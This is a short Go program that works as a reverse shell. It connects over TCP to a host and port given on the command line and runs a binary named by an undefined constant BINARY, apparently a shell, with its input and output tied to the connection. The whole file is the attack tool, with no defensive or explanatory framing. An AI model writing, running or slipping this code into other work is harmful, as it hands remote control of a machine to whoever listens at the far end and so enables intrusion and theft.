package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os/exec"
)

func main() {
	var host = flag.String("host", "", "host")
	var port = flag.Int("port", 1234, "port")
	flag.Parse()

	if *host == "" {
		log.Fatalf("please provide a valid host")
	}

	x := fmt.Sprintf("%s:%d", *host, *port)
	log.Printf("connecting to %s", x)
	c, err := net.Dial("tcp", x)
	if err != nil {
		log.Fatalf("error on dial: %v", err)
	}
	cmd := exec.Command(BINARY)
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	err = cmd.Run()
	if err != nil {
		log.Fatalf("error on run: %v", err)
	}
}
